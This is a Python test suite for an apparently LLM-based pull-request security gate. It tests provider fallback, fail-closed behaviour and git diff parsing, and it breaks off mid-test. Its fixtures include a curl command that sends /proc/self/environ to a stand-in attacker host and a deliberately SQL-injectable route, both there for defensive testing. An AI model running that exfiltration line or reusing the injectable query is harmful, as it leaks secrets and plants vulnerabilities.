"""Porteiro: z.ai HTTP 429 with error code 1113 (no balance) stops at once;
1302 (rate limit) keeps the backoff. The gate still fails closed (exit 3).
Round 2: no verdict shopping (cut replies with findings, content filters),
time budget that fits the job, odd response bodies, private failure reasons.
Round 3: quoted diff headers, cut replies that don't parse, lenient normaliza,
partial reads of big diffs, public log without failure reasons.
Round 4: binary route, pathspec excludes and lockfiles, severity/confidence
spellings, dropped findings, duplicate keys, submodules, tests in CI.
Round 5: assets skipped only when every name is an image/font and the block is
really binary; symlinks, snapshots, non-asset binaries, English keys, big
risk-only diffs, image-only PRs.
Round 6: the gate's own source (U+FFFD only on added lines), assets decided by
the new side, a finding cut before its severity, repeated keys, severity words."""
import http.client
import io
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import unittest
import urllib.error
from contextlib import ExitStack, redirect_stdout
from pathlib import Path
from unittest.mock import mock_open, patch

sys.path.insert(0, str(Path(__file__).resolve().parent))
import porteiro  # noqa: E402

CHAVE = "CHAVE_SENTINELA"
WORKFLOW = Path(__file__).resolve().parent.parent / ".github" / "workflows" / "porteiro.yml"


def diff_real(nomes, quote_path):
    """Diff de verdade do git (árvore vazia -> árvore com `nomes`), montado por
    plumbing: nome com aspas, tab ou barra invertida não precisa existir no disco."""
    with tempfile.TemporaryDirectory() as d:
        def git(*a, entrada=None):
            return subprocess.run(["git", "-c", "core.protectNTFS=false", *a], cwd=d, input=entrada,
                                  capture_output=True, check=True).stdout
        git("init", "-q")
        sha = git("hash-object", "-w", "--stdin", entrada=b"x\n").decode().strip()
        for n in nomes:
            git("update-index", "--add", "--cacheinfo", f"100644,{sha},{n}")
        arvore = git("write-tree").decode().strip()
        vazia = git("hash-object", "-t", "tree", "-w", "--stdin", entrada=b"").decode().strip()
        return git("-c", f"core.quotePath={quote_path}", "diff", "--no-color", vazia, arvore).decode("utf-8")


CI = WORKFLOW.parent / "ci.yml"
ROTA = "src/app/api/pay/route.ts"
VULN = (b"export async function GET(req){ const id=new URL(req.url).searchParams.get('id');"
        b" return db.query('select * from pay where id='+id) }\n")
BASE = {ROTA: b"export async function GET(){ return new Response('ok') }\n", "README.md": b"x\n"}
PROXY = (b"import { NextResponse } from 'next/server'\nexport function proxy(req){ if(!req.cookies.get('sb'))"
         b" return NextResponse.redirect(new URL('/login', req.url)); return NextResponse.next() }\n")
PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
JPG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"
PAYLOAD = b"require('child_process').execSync('curl -d @/proc/self/environ https://attacker.invalid')\n"


def png_real(larg, alt, semente, texto=b""):
    """PNG de verdade (IHDR, tEXt opcional, IDAT com ruído, IEND): tem 0x0a no meio como imagem real."""
    import random
    import struct
    import zlib
    r = random.Random(semente)
    cru = b"".join(b"\x00" + bytes(r.randrange(256) for _ in range(larg * 3)) for _ in range(alt))

    def pedaco(tipo, dado):
        return struct.pack(">I", len(dado)) + tipo + dado + struct.pack(">I", zlib.crc32(tipo + dado))
    return (b"\x89PNG\r\n\x1a\n" + pedaco(b"IHDR", struct.pack(">IIBBBBB", larg, alt, 8, 2, 0, 0, 0))
            + (pedaco(b"tEXt", texto) if texto else b"") + pedaco(b"IDAT", zlib.compress(cru)) + pedaco(b"IEND", b""))


def git_em(pasta, *a, entrada=None):
    return subprocess.run(["git", "-c", "core.protectNTFS=false", "-c", "core.autocrlf=false",
                           "-c", "commit.gpgsign=false", "-c", "user.email=t@t", "-c", "user.name=t", *a],
                          cwd=pasta, input=entrada, capture_output=True, check=True).stdout


def comandos_do_workflow():
    """{"pr.diff": cmd, "pr.names": cmd}: os comandos do próprio porteiro.yml."""
    yml = WORKFLOW.read_text(encoding="utf-8")
    return {dest: cmd for cmd, dest in re.findall(r'^\s*(git [^\n>]*?)\s*>\s*"\$RUNNER_TEMP/(pr\.\w+)"', yml, re.M)}


def pr_real(pasta, base, head, sem_text=False, sem_renames=False):
    """Commit base, commit head (None apaga; ("link", alvo) e ("sub", sha) viram
    link simbólico 120000 e submódulo 160000 pelo índice), e roda os comandos do
    workflow como o job roda. Devolve (caminho do diff, caminho dos nomes)."""
    repo = Path(pasta, "repo")
    repo.mkdir()
    git_em(repo, "init", "-q")
    shas = []
    for arvore in (base, head):
        especiais = {p: c for p, c in arvore.items() if isinstance(c, tuple)}
        for p, c in arvore.items():
            if p in especiais:
                continue
            f = repo / p
            f.parent.mkdir(parents=True, exist_ok=True)
            f.unlink() if c is None else f.write_bytes(c)
        git_em(repo, "add", "-A")
        for p, (tipo, alvo) in especiais.items():
            sha = alvo if tipo == "sub" else git_em(repo, "hash-object", "-w", "--stdin", entrada=alvo.encode()).decode().strip()
            git_em(repo, "update-index", "--add", "--cacheinfo", f"{'160000' if tipo == 'sub' else '120000'},{sha},{p}")
        git_em(repo, "commit", "-qm", "x", "--allow-empty")
        shas.append(git_em(repo, "rev-parse", "HEAD").decode().strip())
    saidas = []
    for dest in ("pr.diff", "pr.names"):
        cmd = comandos_do_workflow()[dest].replace("$BASE...$HEAD", "{}...{}".format(*shas))
        if sem_text:  # a local run, or the old workflow: no --text
            cmd = cmd.replace(" --text", "")
        if sem_renames:  # a local run: git's default rename detection
            cmd = cmd.replace(" --no-renames", "")
        Path(pasta, dest).write_bytes(subprocess.run(shlex.split(cmd), cwd=repo, capture_output=True, check=True).stdout)
        saidas.append(str(Path(pasta, dest)))
    return tuple(saidas)


def diff_submodulo(antes, depois):
    """Diff de verdade de um submódulo (modo 160000); antes=None = submódulo novo."""
    with tempfile.TemporaryDirectory() as d:
        git_em(d, "init", "-q")
        arvores = []
        for alvo in (antes, depois):
            git_em(d, "read-tree", "--empty")
            if alvo:
                git_em(d, "update-index", "--add", "--cacheinfo", f"160000,{alvo},vendor/sub")
            arvores.append(git_em(d, "write-tree").decode().strip())
        return git_em(d, "-c", "core.quotePath=false", "diff", "--no-color", "--text", *arvores).decode()


class ErroDaZaiTest(unittest.TestCase):
    def roda(self, codigo, canal="no Telegram"):
        def responde(*_args, **_kwargs):
            corpo = json.dumps({"error": {"code": codigo, "message": "msg"}}).encode()
            raise urllib.error.HTTPError(porteiro.URL, 429, "Too Many Requests", {}, io.BytesIO(corpo))

        saida = io.StringIO()
        with patch.dict(os.environ, {"GLM_API_KEY": CHAVE, "PORTEIRO_MODO": "avisa"}, clear=True), \
             patch("builtins.open", mock_open(read_data="diff --git a/a b/a\n+x")), \
             patch.object(porteiro, "escreve") as escreve, \
             patch.object(porteiro, "manda_detalhe", return_value=canal) as detalhe, \
             patch.object(porteiro.time, "sleep") as dorme, \
             patch("urllib.request.urlopen", side_effect=responde) as req, \
             redirect_stdout(saida):
            codigo_saida = porteiro.main(["--diff", "d", "--placar", "p"])
        placar = escreve.call_args.args[1]
        self.assertEqual(codigo_saida, 3)  # fail-closed, even in "avisa"
        self.assertIn("NÃO ANALISADO", placar)
        self.assertNotIn(CHAVE, saida.getvalue() + placar)
        return req.call_count, dorme.call_count, placar, saida.getvalue(), str(detalhe.call_args)

    def test_1113_para_na_hora_e_diz_saldo_zerado(self):
        chamadas, dormidas, placar, log, privado = self.roda("1113")
        self.assertEqual((chamadas, dormidas), (1, 0))
        self.assertIn("saldo da z.ai zerado (código 1113)", privado)
        self.assertNotIn("1113", placar)  # billing state stays out of the public comment
        # Round 3: the private channel got the reason, so the public log has no code...
        self.assertNotIn("1113", log)
        self.assertIn("sem veredito: z.ai glm-5 (motivo no canal privado)", log)
        # ...and only the short code when the alert did not go through.
        _, _, _, log, _ = self.roda("1113", canal="não entregue (HTTP 500)")
        self.assertIn("z.ai glm-5: código 1113", log)
        self.assertNotIn("saldo", log)

    def test_1302_mantem_o_backoff_e_mostra_o_codigo(self):
        chamadas, dormidas, placar, log, privado = self.roda("1302")
        self.assertEqual((chamadas, dormidas), (6, 5))
        self.assertIn("código 1302", privado)
        self.assertNotIn("1302", placar)
        self.assertNotIn("1302", log)
        _, _, _, log, _ = self.roda("1302", canal="indisponível (canal privado não configurado)")
        self.assertIn("z.ai glm-5: HTTP 429, código 1302", log)


VAZIO_JSON = '{"achados":[]}'
FAIL_JSON = json.dumps({"achados": [
    {"titulo": "IDOR", "arquivo": "a", "severidade": "alta", "confianca": 0.9}]})
AVISO_JSON = json.dumps({"achados": [
    {"titulo": "leve", "arquivo": "a", "severidade": "baixa", "confianca": 0.9}]})
ALTA = {"titulo": "IDOR", "arquivo": "a", "severidade": "alta", "confianca": 0.9}
# Reply cut mid-array: one complete blocking finding, then half of another.
CORTADO_COM_BLOQ = '{"achados":[' + json.dumps(ALTA) + ',{"titulo":"segundo","sever'
# Cut before any finding closed, but the raw text already says "critica".
CORTADO_SO_INDICIO = '{"achados":[{"severidade": "critica","arquivo":"a","titulo":"SQL inj'
TODAS = {"GLM_API_KEY": CHAVE, "KIMI_API_KEY": CHAVE, "OPENAI_API_KEY": CHAVE}
Z1113 = (429, {"code": "1113", "message": "m"})
Z1302 = (429, {"code": "1302", "message": "m"})
KIMI_QUOTA = (429, {"type": "exceeded_current_quota_error", "message": "m"})
OPENAI_QUOTA = (429, {"code": "insufficient_quota", "type": "insufficient_quota", "message": "m"})


class CadeiaDeReservaTest(unittest.TestCase):
    """Sem veredito do provedor da vez, o próximo analisa. Veredito válido não cai.

    Resposta por modelo: str = content com finish "stop"; (content, finish);
    (status HTTP, corpo de erro); bytes = corpo cru; exceção = levantada;
    lista = uma por chamada (a última se repete)."""

    def roda(self, por_modelo, env=TODAS, modo="barra", relogio=None,
             diff="diff --git a/a b/a\n+x", canal="no Telegram", reais=None):
        """reais=(diff, nomes): arquivos de verdade no disco, sem mock do open."""
        pedidos, self.timeouts = [], []

        def responde(req, timeout=None):
            corpo = json.loads(req.data)
            pedidos.append((req.full_url, corpo))
            self.timeouts.append(timeout)
            r = por_modelo[corpo["model"]]
            if isinstance(r, list):
                r = r.pop(0) if len(r) > 1 else r[0]
            if isinstance(r, BaseException):
                if relogio is not None:
                    relogio[0] += timeout  # the call hung until its timeout
                raise r
            if isinstance(r, bytes):
                return io.BytesIO(r)
            if not isinstance(r, str) and isinstance(r[0], int):
                raise urllib.error.HTTPError(req.full_url, r[0], "x", {},
                                             io.BytesIO(json.dumps({"error": r[1]}).encode()))
            content, finish = (r, "stop") if isinstance(r, str) else r
            return io.BytesIO(json.dumps({"choices": [{"message": {"content": content},
                              "finish_reason": finish}], "usage": {"total_tokens": 10}}).encode())

        def dorme_relogio(s):
            if relogio is not None:
                relogio[0] += s

        saida = io.StringIO()
        with ExitStack() as pilha:
            pilha.enter_context(patch.dict(os.environ, dict(env, PORTEIRO_MODO=modo), clear=True))
            if not reais:
                pilha.enter_context(patch("builtins.open", mock_open(read_data=diff)))
            escreve = pilha.enter_context(patch.object(porteiro, "escreve"))
            detalhe = pilha.enter_context(patch.object(porteiro, "manda_detalhe", return_value=canal))
            dorme = pilha.enter_context(patch.object(porteiro.time, "sleep", side_effect=dorme_relogio))
            if relogio is not None:
                pilha.enter_context(patch.object(porteiro.time, "monotonic", side_effect=lambda: relogio[0]))
            pilha.enter_context(patch("urllib.request.urlopen", side_effect=responde))
            pilha.enter_context(redirect_stdout(saida))
            codigo = porteiro.main(["--diff", reais[0], "--nomes", reais[1], "--placar", "p"] if reais
                                   else ["--diff", "d", "--placar", "p"])
        placar = escreve.call_args.args[1]
        self.assertNotIn(CHAVE, saida.getvalue() + placar)
        self.dormidas = dorme.call_count
        self.privado = str(detalhe.call_args_list)
        self.detalhe = detalhe.call_args_list
        self.log = saida.getvalue()
        return codigo, placar, [c["model"] for _, c in pedidos], pedidos

    def test_1113_no_zai_usa_kimi_k3(self):
        codigo, placar, modelos, _ = self.roda({"glm-5": Z1113, "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos, self.dormidas), (0, ["glm-5", "kimi-k3"], 0))
        self.assertIn("Kimi kimi-k3 (reserva)", placar)
        self.assertNotIn("1113", placar)
        self.assertIn("código 1113", self.privado)

    def test_kimi_sem_cota_usa_k26(self):
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": Z1113, "kimi-k3": KIMI_QUOTA, "kimi-k2.6": VAZIO_JSON})
        self.assertEqual((codigo, modelos, self.dormidas), (0, ["glm-5", "kimi-k3", "kimi-k2.6"], 0))
        self.assertIn("Kimi kimi-k2.6 (reserva)", placar)

    def test_k26_falha_usa_openai(self):
        codigo, placar, modelos, pedidos = self.roda(
            {"glm-5": Z1113, "kimi-k3": KIMI_QUOTA,
             "kimi-k2.6": (401, {"type": "invalid_authentication_error"}), "gpt-6-astra": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (0, ["glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra"]))
        self.assertIn("OpenAI gpt-6-astra (reserva)", placar)
        url, corpo = pedidos[-1]
        self.assertEqual(url, "https://api.openai.com/v1/chat/completions")
        self.assertNotIn("temperature", corpo)
        self.assertNotIn("max_tokens", corpo)  # gpt-5.x recusa; usa max_completion_tokens
        self.assertGreaterEqual(corpo["max_completion_tokens"], 8192)

    def test_todas_falham_fail_closed(self):
        for modo in ("avisa", "barra"):
            codigo, placar, modelos, _ = self.roda(
                {"glm-5": Z1113, "kimi-k3": KIMI_QUOTA, "kimi-k2.6": "desculpe, não sei",
                 "gpt-6-astra": OPENAI_QUOTA, "gpt-5.5": OPENAI_QUOTA}, modo=modo)
            self.assertEqual(codigo, 3)
            # k2.6 respondeu fora do formato 3x (os três tetos) antes de cair.
            self.assertEqual(modelos, ["glm-5", "kimi-k3"] + ["kimi-k2.6"] * 3 + ["gpt-6-astra", "gpt-5.5"])
            self.assertIn("NÃO ANALISADO", placar)
            self.assertIn("nenhuma IA disponível (5 provedores)", placar)
            for trecho in ("z.ai glm-5: saldo da z.ai zerado (código 1113)",
                           "Kimi kimi-k3: saldo da Kimi zerado (código exceeded_current_quota_error)",
                           "Kimi kimi-k2.6: não devolveu JSON",
                           "OpenAI gpt-6-astra: saldo da OpenAI zerado (código insufficient_quota)",
                           "OpenAI gpt-5.5: saldo da OpenAI zerado (código insufficient_quota)"):
                self.assertIn(trecho, self.privado)
            # Billing and credential reasons never reach the public comment.
            for publico_nao in ("1113", "saldo", "insufficient_quota", "exceeded_current_quota_error"):
                self.assertNotIn(publico_nao, placar)

    def test_sem_chave_e_pulado(self):
        codigo, placar, modelos, _ = self.roda({"kimi-k3": VAZIO_JSON}, env={"KIMI_API_KEY": CHAVE})
        self.assertEqual((codigo, modelos), (0, ["kimi-k3"]))
        self.assertIn("Kimi kimi-k3 (reserva)", placar)
        self.assertNotIn("sem chave", placar)
        self.assertIn("z.ai glm-5: sem chave", self.privado)
        codigo, placar, modelos, _ = self.roda({}, env={})
        self.assertEqual((codigo, modelos), (3, []))
        self.assertIn("sem chave do analisador", placar)

    def test_veredito_fail_do_primario_nao_cai(self):
        codigo, placar, modelos, _ = self.roda({"glm-5": FAIL_JSON, "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        self.assertIn("1 bloqueante", placar)
        self.assertNotIn("reserva", placar)

    def test_corpo_moonshot_sem_temperature_e_teto_8192(self):
        _, _, _, pedidos = self.roda({"glm-5": Z1113, "kimi-k3": VAZIO_JSON})
        (url_z, zai), (url_k, kimi) = pedidos
        self.assertEqual(url_k, "https://api.moonshot.ai/v1/chat/completions")
        self.assertNotIn("temperature", kimi)
        self.assertGreaterEqual(kimi["max_tokens"], 8192)
        # O primário continua igual: z.ai, glm-5, temperature 0.1, teto 4000.
        self.assertEqual((url_z, zai["temperature"], zai["max_tokens"]), (porteiro.URL, 0.1, 4000))

    def test_cadeia_padrao_so_com_reservas_aprovadas(self):
        # glm-5 primeiro, depois só quem passou no controle adversarial de 15/09/2026.
        self.assertEqual([p.rotulo for p in porteiro.le_cadeia({})],
                         ["z.ai glm-5", "Kimi kimi-k3", "Kimi kimi-k2.6",
                          "OpenAI gpt-6-astra", "OpenAI gpt-5.5"])

    def test_cadeia_e_modelo_primario_configuraveis(self):
        _, _, modelos, _ = self.roda({"glm-4.6": VAZIO_JSON},
                                     env=dict(TODAS, PORTEIRO_MODELO="glm-4.6"))
        self.assertEqual(modelos, ["glm-4.6"])
        _, placar, modelos, _ = self.roda({"gpt-x": Z1113, "glm-5": VAZIO_JSON},
                                          env=dict(TODAS, PORTEIRO_CADEIA="openai:gpt-x, zai:glm-5"))
        self.assertEqual(modelos, ["gpt-x", "glm-5"])
        self.assertIn("z.ai glm-5 (reserva)", placar)

    # ---- Round 2: no verdict shopping -----------------------------------
    def test_A_bloqueante_cortado_por_length_barra(self):
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": (FAIL_JSON, "length"), "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))  # zero Kimi calls
        self.assertIn("1 bloqueante", placar)
        self.assertIn("Resposta cortada (truncado)", placar)

    def test_A2_bloqueante_cortado_por_sensitive(self):
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": (FAIL_JSON, "sensitive"), "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        self.assertIn("1 bloqueante", placar)

    def test_B_bloqueante_cortado_e_depois_429_nao_cai(self):
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": [(FAIL_JSON, "length"), Z1302], "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        self.assertIn("1 bloqueante", placar)

    def test_B2_aviso_cortado_e_depois_429_da_3(self):
        for modo in ("avisa", "barra"):
            codigo, placar, modelos, _ = self.roda(
                {"glm-5": [(AVISO_JSON, "network_error"), Z1302], "kimi-k3": VAZIO_JSON}, modo=modo)
            self.assertEqual((codigo, modelos), (3, ["glm-5"]))
            self.assertIn("NÃO ANALISADO", placar)
            self.assertIn("resposta cortada", placar)
            self.assertIn("leve", self.privado)  # the finding still reaches the private channel

    def test_C_filtro_1301_da_zai_fecha_sem_reserva(self):
        for modo in ("avisa", "barra"):
            codigo, placar, modelos, _ = self.roda(
                {"glm-5": (400, {"code": "1301", "message": "m"}), "kimi-k3": VAZIO_JSON}, modo=modo)
            self.assertEqual((codigo, modelos), (3, ["glm-5"]))
            self.assertIn("filtro de conteúdo, código 1301", placar)

    def test_C2_filtro_da_moonshot_fecha_sem_reserva(self):
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": Z1113, "kimi-k3": (400, {"type": "content_filter", "message": "m"}),
             "kimi-k2.6": VAZIO_JSON, "gpt-6-astra": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (3, ["glm-5", "kimi-k3"]))
        self.assertIn("filtro de conteúdo", placar)

    def test_C3_finish_content_filter_e_refusal_fecham(self):
        recusa = json.dumps({"choices": [{"message": {"content": None, "refusal": "no"},
                                          "finish_reason": "stop"}]}).encode()
        for resposta in ((VAZIO_JSON, "content_filter"), (VAZIO_JSON, "sensitive"), recusa):
            codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
            self.assertEqual((codigo, modelos), (3, ["glm-5"]), resposta)
            self.assertIn("filtro de conteúdo", placar)

    # ---- Round 2: robustness ---------------------------------------------
    def test_D_corpo_estranho_vira_tentativa_falha(self):
        for corpo in (b"null", b"[]", b'{"choices": null}', b'{"choices": [null]}',
                      b'{"choices": [{"message": "x"}]}',
                      b'{"choices": [{"message": {"content": 5}}], "usage": "x"}',
                      b"\x80\x81", http.client.IncompleteRead(b"")):
            with self.subTest(corpo=corpo):
                codigo, _, modelos, _ = self.roda({"glm-5": corpo, "kimi-k3": VAZIO_JSON})
                self.assertEqual((codigo, modelos[-1]), (0, "kimi-k3"))

    # ---- Round 2: time budget --------------------------------------------
    def test_E_cadeia_inteira_cabe_no_prazo_do_job(self):
        relogio = [0.0]
        codigo, placar, modelos, _ = self.roda(
            {m: TimeoutError("timed out") for m in ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")},
            relogio=relogio)
        self.assertEqual(codigo, 3)
        self.assertIn("NÃO ANALISADO", placar)
        # Every reserve got its turn, and nothing ran past the analysis step's cap.
        self.assertEqual(set(modelos), {"glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5"})
        self.assertLessEqual(relogio[0], porteiro.PRAZO_TOTAL)
        teto_min = min(int(m) for m in re.findall(r"timeout-minutes:\s*(\d+)", WORKFLOW.read_text(encoding="utf-8")))
        self.assertLessEqual(relogio[0] + 60, teto_min * 60, relogio[0])
        self.assertLessEqual(max(self.timeouts), 180)

    def test_F_edicao_do_proprio_portao_e_caminho_de_risco(self):
        for caminho in ("scripts/porteiro.py", "scripts/test_porteiro.py", ".github/workflows/porteiro.yml"):
            self.assertTrue(porteiro.eh_de_risco(caminho), caminho)

    # ---- Round 3: quoted paths (major 1) ---------------------------------
    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_G_cabecalho_entre_aspas_do_git_de_verdade(self):
        nomes = ["src/ação.ts", 'src/we"ird.ts', "src/tab\there.ts", "src/back\\slash.ts", "src/ok.ts"]
        for quote_path in ("true", "false"):
            diff = diff_real(nomes, quote_path)
            self.assertIn('diff --git "a/src/', diff)  # git really quoted some headers
            self.assertEqual(sorted(porteiro.arquivos_do_diff(diff)), sorted(nomes), quote_path)
        # Mixed PR: the finding on the non-ASCII file is read and blocks.
        achado = json.dumps({"achados": [dict(ALTA, arquivo="src/ação.ts")]})
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": achado}, diff=diff_real(["src/ação.ts", "src/ok.ts"], "true"))
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        self.assertIn("1 bloqueante", placar)
        self.assertIn("core.quotePath=false diff", WORKFLOW.read_text(encoding="utf-8"))

    def test_G2_diff_com_conteudo_sem_cabecalho_lido_da_3(self):
        for diff in ("+x\n-y\n", "diff --git c/x d/x\n+x\n", 'diff --git a/a b/a\n+x\ndiff --git "a/q\n+y\n'):
            for modo in ("avisa", "barra"):
                with self.subTest(diff=diff, modo=modo):
                    codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, diff=diff, modo=modo)
                    self.assertEqual((codigo, modelos), (3, []))
                    self.assertIn("NÃO ANALISADO", placar)

    # ---- Round 3: cut reply that does not parse (major 2) ----------------
    def test_H_cortado_sem_parse_com_bloqueante_inteiro_barra(self):
        for fim in ("length", "network_error", "outra"):
            with self.subTest(fim=fim):
                codigo, placar, modelos, _ = self.roda(
                    {"glm-5": [(CORTADO_COM_BLOQ, fim), Z1302], "kimi-k3": VAZIO_JSON})
                self.assertEqual((codigo, modelos), (1, ["glm-5"]))  # never asks Kimi
                self.assertIn("1 bloqueante", placar)
                self.assertIn("Resposta cortada (json_malformado)", placar)

    def test_H2_cortado_so_com_indicio_da_3(self):
        for modo in ("avisa", "barra"):
            for fim in ("length", "network_error", "stop"):
                with self.subTest(modo=modo, fim=fim):
                    codigo, placar, modelos, _ = self.roda(
                        {"glm-5": [(CORTADO_SO_INDICIO, fim), Z1302], "kimi-k3": VAZIO_JSON}, modo=modo)
                    self.assertEqual((codigo, modelos), (3, ["glm-5"]))
                    self.assertIn("NÃO ANALISADO", placar)
                    self.assertIn("resposta cortada com indício de achado grave", placar)
                    self.assertNotIn("SQL", placar)
                    self.assertIn("indício de achado grave", self.privado)

    # ---- Round 3: minors ---------------------------------------------------
    def test_I_entrada_invalida_nao_derruba_o_bloqueante(self):
        resposta = json.dumps({"achados": [None, "x", {"titulo": "", "severidade": "baixa"}, ALTA]})
        codigo, _, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        # A critica/alta entry without a title is kept and still blocks.
        sem_titulo = json.dumps({"achados": [dict(ALTA, titulo=None, severidade="critica")]})
        codigo, _, modelos, _ = self.roda({"glm-5": sem_titulo, "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))
        # Only invalid entries is still "out of format".
        self.assertIsNone(porteiro.normaliza({"achados": [None, {"titulo": "", "severidade": "media"}]}))

    def test_J_numero_absurdo_nao_derruba(self):
        texto = ('{"achados":[{"titulo":"IDOR","arquivo":"a","severidade":"alta",'
                 '"confianca":1' + "0" * 400 + ',"linha":1e400}]}')
        a = porteiro.normaliza(porteiro.extrai_json(texto))["achados"][0]
        # Round 4: an alta finding whose confidence overflows is 1.0, not 0.5.
        self.assertEqual((a["confianca"], a["linha"]), (1.0, 0))
        # NaN falls back to the default: 0.5 for a light finding; Round 5: a title
        # with no severity is alta, so its default is 1.0.
        self.assertEqual(porteiro.normaliza(porteiro.extrai_json(
            '{"achados":[{"titulo":"t","severidade":"baixa","confianca":NaN}]}'))["achados"][0]["confianca"], 0.5)
        self.assertEqual(porteiro.normaliza(porteiro.extrai_json(
            '{"achados":[{"titulo":"t","confianca":NaN}]}'))["achados"][0]["confianca"], 1.0)
        codigo, placar, modelos, _ = self.roda({"glm-5": texto})
        self.assertEqual((codigo, modelos), (1, ["glm-5"]))  # blocks, no crash
        self.assertIn("1 achado · 1 bloqueante", placar)

    def test_K_json_patologico_vira_malformado(self):
        for texto in ("1" * 5000, "[" * 100000, '{"achados":' + "[" * 100000):
            self.assertIsNone(porteiro.extrai_json(texto))
        self.assertIsNone(porteiro.resgata('{"achados":[' + "[" * 100000))

    def test_K2_recursionerror_nao_cai_para_a_proxima_ia(self):
        with patch.object(porteiro, "normaliza", side_effect=RecursionError):
            codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON, "kimi-k3": VAZIO_JSON})
        self.assertEqual((codigo, modelos), (3, ["glm-5"]))
        self.assertIn("NÃO ANALISADO", placar)

    def test_L_caminho_do_achado_normalizado_e_descarte_contado(self):
        base = porteiro.normaliza({"achados": [ALTA]})["achados"][0]
        for arq in ("b/src/app/x.ts", "a/src/app/x.ts", "src\\app\\x.ts", "./src/app/x.ts"):
            bloq, _, fora = porteiro.classifica([dict(base, arquivo=arq)], ["src/app/x.ts"])
            self.assertEqual((len(bloq), fora), (1, 0), arq)
        # Round 4: only a non-blocking finding on an untouched file is dropped.
        resposta = json.dumps({"achados": [dict(ALTA, arquivo="b/a"),
                                           dict(ALTA, arquivo="outro.ts", titulo="base", severidade="baixa")]})
        codigo, placar, _, _ = self.roda({"glm-5": resposta})
        self.assertEqual(codigo, 1)
        self.assertIn("1 achado · 1 bloqueante", placar)
        self.assertEqual(self.detalhe[-1].args[3], 1)  # one dropped, counted privately
        self.assertIn("descartados: 2", porteiro.corpo_alerta([], [], "7", "u", (), 2)["detalhe"])

    def test_M_diff_grande_parcial_nunca_verde(self):
        grande = "diff --git a/README.md b/README.md\n" + "+x\n" * 1000
        risco = "diff --git a/src/app/api/p.ts b/src/app/api/p.ts\n+y\n"
        env = dict(TODAS, PORTEIRO_MAX_DIFF_KB="1")
        for modo in ("avisa", "barra"):
            with self.subTest(modo=modo):
                codigo, placar, modelos, pedidos = self.roda({"glm-5": VAZIO_JSON}, env=env, modo=modo, diff=grande + risco)
                self.assertEqual((codigo, modelos), (3, ["glm-5"]))
                self.assertIn("PARCIAL — 1 arquivo(s) não lidos (diff grande)", placar)
                self.assertNotIn("✅", placar)
                self.assertNotIn("README", pedidos[0][1]["messages"][1]["content"])
                # No risk path at all: no AI call, and still not green.
                codigo, placar, modelos, _ = self.roda({"glm-5": VAZIO_JSON}, env=env, modo=modo, diff=grande)
                self.assertEqual((codigo, modelos), (3, []))
                self.assertIn("PARCIAL — 1 arquivo(s) não lidos", placar)
                self.assertNotIn("✅", placar)
        # A blocking finding in the files that were read still blocks.
        achado = json.dumps({"achados": [dict(ALTA, arquivo="src/app/api/p.ts")]})
        codigo, _, _, _ = self.roda({"glm-5": achado}, env=env, diff=grande + risco)
        self.assertEqual(codigo, 1)

    def test_N_filtro_de_conteudo_manda_os_motivos_ao_privado(self):
        codigo, placar, modelos, _ = self.roda(
            {"glm-5": Z1113, "kimi-k3": (400, {"type": "content_filter", "message": "m"})})
        self.assertEqual((codigo, modelos), (3, ["glm-5", "kimi-k3"]))
        self.assertIn("saldo da z.ai zerado (código 1113)", self.privado)
        self.assertIn("Kimi kimi-k3: recusou o diff (filtro de conteúdo, código content_filter)", self.privado)
        self.assertIn("motivo no Telegram", placar)
        self.assertNotIn("1113", placar)

    def test_O_log_publico_so_rotulo_e_codigo_se_nao_entregue(self):
        self.roda({"glm-5": Z1113, "kimi-k3": VAZIO_JSON})
        self.assertIn("sem veredito: z.ai glm-5 (motivo no canal privado)", self.log)
        for privado in ("1113", "saldo"):
            self.assertNotIn(privado, self.log)
        self.roda({"glm-5": Z1113, "kimi-k3": VAZIO_JSON}, canal="não entregue (HTTP 502)")
        self.assertIn("z.ai glm-5: código 1113", self.log)
        self.assertNotIn("saldo", self.log)

    # ---- Round 4: pre-existing bypasses (each failed on main after #408) ----
    def pr(self, head, por_modelo, base=BASE, sem_text=False, sem_renames=False, **kw):
        with tempfile.TemporaryDirectory() as d:
            return self.roda(por_modelo, reais=pr_real(d, base, head, sem_text, sem_renames), **kw)

    def viu(self, pedidos):
        return "".join(c["messages"][1]["content"] for _, c in pedidos)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P1_binario_nao_esconde_codigo(self):
        # The workflow's own diff command shows the code behind `* -diff`...
        # Round 5: ...and a NUL byte in a code file is "binário não lido" (3),
        # stricter than handing the model a route it may misread.
        for nome, head in (("NUL", {ROTA: b"// \x00\n" + VULN}),
                           ("-diff", {".gitattributes": b"* -diff\n", ROTA: VULN})):
            with self.subTest(nome):
